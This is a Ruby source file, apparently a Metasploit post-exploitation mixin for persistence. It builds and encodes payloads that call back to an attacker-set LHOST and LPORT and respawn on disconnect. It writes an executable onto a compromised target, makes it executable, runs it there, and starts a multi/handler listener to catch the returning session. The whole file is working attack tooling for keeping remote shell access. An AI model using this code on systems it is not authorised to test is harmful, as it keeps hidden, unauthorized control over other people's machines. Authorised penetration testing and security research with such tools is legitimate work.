
module Msf
class Post
module Persistence

	def initialize(info = {})
		super

		register_options(
			[
				OptAddress.new('LHOST', [true, 'IP for persistent payload to connect to.']),
				OptInt.new('LPORT', [true, 'Port for persistent payload to connect to.']),
				OptInt.new('DELAY', [true, 'Delay in seconds for persistent payload to reconnect.', 5]),
				OptBool.new('HANDLER', [ false, 'Start a Multi/Handler to Receive the session.', true]),
				OptPath.new('TEMPLATE', [false, 'Alternate template Binary File to use.']),
				OptPath.new('REXE',[false, 'Use an alternative on disk executable.','']),
				OptString.new('REXENAME',[false, 'The name to call exe on remote system','']),
				OptString.new('RBATCHNAME',[false, 'The name to call the batch on remote system (for keepalive)','']),
				OptString.new('REXEPATH',[false, 'Use alternative path on remote system instead of home directory','']),
				OptBool.new('EXECUTE', [true, 'Execute the binary file once uploaded.', false]),
				OptBool.new('KEEPALIVE', [true, 'Respawn the shell upon disconection.' , true]),
			], self.class)

		register_advanced_options(
			[
				OptString.new('OPTIONS', [false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format.",""]),
				OptString.new('ENCODER', [false, "Encoder name to use for encoding.",]),
				OptInt.new('ITERATIONS', [false, 'Number of iterations for encoding.'])
			], self.class)

	end

	# Generate raw payload
	#-------------------------------------------------------------------------------
	def pay_gen(pay,encoder, iterations)
		raw = pay.generate
		if encoder
			if enc_compat(pay, encoder)
				print_status("Encoding with #{encoder}")
				enc = framework.encoders.create(encoder)
				(1..iterations).each do |i|
					print_status("\tRunning iteration #{i}")
					raw = enc.encode(raw, nil, nil, "Windows")
				end
			end
		end
		return raw
	end

	# Check if encoder specified is in the compatible ones
	#
	# Note: This should allow to adapt to new encoders if they appear with out having
	# to have a static whitelist.
	#-------------------------------------------------------------------------------
	def enc_compat(payload, encoder)
		compat = false
		payload.compatible_encoders.each do |e|
			if e[0] == encoder.strip
				compat = true
			end
		end
		return compat
	end

	# Create a payload given a name, lhost and lport, additional options
	#-------------------------------------------------------------------------------
	def create_payload(name, lhost, lport, opts = "")
		pay = session.framework.payloads.create(name)
		pay.datastore['LHOST'] = lhost
		pay.datastore['LPORT'] = lport
		if not opts.empty?
			opts.split(",").each do |o|
				opt,val = o.split("=", 2)
				pay.datastore[opt] = val
			end
		end
		# Validate the options for the module
		pay.options.validate(pay.datastore)
		return pay

	end

	def create_payload_from_file(exec)
		print_status("Reading Payload from file #{exec}")
		return ::IO.read(exec)
	end

	# Function for creating log folder and returning log path
	#-------------------------------------------------------------------------------
	def log_file(log_path = nil)
		#Get hostname
		host = session.sys.config.sysinfo["Computer"]

		# Create Filename info to be appended to downloaded files
		filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

		# Create a directory for the logs
		if log_path
			logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
		else
			logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
		end

		# Create the log directory
		::FileUtils.mkdir_p(logs)

		#logfile name
		logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
		return logfile
	end

	# Function for writing executable to target host
	#-------------------------------------------------------------------------------
	def write_unix_bin_to_target(bin, rexename, isbash=false)
		if @use_home_dir
			bindir = get_home_dir()
		else
			bindir = ::File.expand_path(datastore['REXEPATH'])
		end
		binfile  = ::File.join(bindir, rexename)
		write_file(binfile, bin)
		# Check if file has been created
		cmdfile = '[ -f "' +  binfile + '" ] && echo "OK" || echo "KO"'
		checkfile = cmd_exec(cmdfile)
		file_present =  checkfile == 'OK'
		unless file_present
			raise "File has not been created, maybe permission issue on the folder (#{bindir})"
		end
		cmd_exec("chmod +x #{binfile}")
		if isbash
			print_status("Bash File written to #{binfile}")
		else
			print_status("Binary File written to #{binfile}")
		end
		return binfile
	end

	# Method for checking if a listener for a given IP and port is present
	# will return true if a conflict exists and false if none is found
	#-------------------------------------------------------------------------------
	def check_for_listner(lhost,lport)
		conflict = false
		client.framework.jobs.each do |k,j|
			if j.name =~ / multi\/handler/
				current_id = j.jid
				current_lhost = j.ctx[0].datastore["LHOST"]
				current_lport = j.ctx[0].datastore["LPORT"]
				if lhost == current_lhost and lport == current_lport.to_i
					print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
					conflict = true
				end
			end
		end
		return conflict
	end

	# Starts a multi/handler session
	#-------------------------------------------------------------------------------
	def create_multihand(payload,lhost,lport)
		pay = session.framework.payloads.create(payload)
		pay.datastore['LHOST'] = lhost
		pay.datastore['LPORT'] = lport
		print_status("Starting exploit multi handler")
		if not check_for_listner(lhost,lport)
			# Set options for module
			mul = session.framework.exploits.create("multi/handler")
			mul.share_datastore(pay.datastore)
			mul.datastore['WORKSPACE'] = client.workspace
			mul.datastore['PAYLOAD'] = payload
			mul.datastore['EXITFUNC'] = 'thread'
			mul.datastore['ExitOnSession'] = false
			# Validate module options
			mul.options.validate(mul.datastore)
			# Execute showing output
			mul.exploit_simple(
					'Payload'     => mul.datastore['PAYLOAD'],
					'LocalInput'  => self.user_input,
					'LocalOutput' => self.user_output,
					'RunAsJob'    => true
				)
		else
			print_error("Could not start handler!")
			print_error("A job is listening on the same Port")
		end

	end

	# Function to execute script on target 
	#-------------------------------------------------------------------------------
	def target_shell_exec(bin_on_target)
		print_status("Executing binary file #{bin_on_target}")
		cmd_exec(bin_on_target)
		return 
	end

end
end
end

